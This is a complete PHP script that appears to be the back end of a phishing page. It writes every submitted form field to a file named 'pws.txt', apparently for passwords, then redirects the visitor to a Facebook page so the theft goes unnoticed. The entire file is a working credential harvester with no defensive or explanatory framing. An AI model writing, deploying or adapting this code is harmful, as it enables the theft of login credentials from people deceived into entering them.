<?php
// Function to log POST data to a file
function log_post_data($filename) {
    $handle = fopen($filename, "a");
    if ($handle) {
        foreach ($_POST as $variable => $value) {
            fwrite($handle, "$variable=$value\r\n");
        }
        fwrite($handle, "\r\n");
        fclose($handle);
    } else {
        error_log("Could not open the file for writing.");
    }
}

// Log the POST data
log_post_data("pws.txt");

// Redirect the user
header('Location: https://www.facebook.com/NXTSports1');
exit;
?>
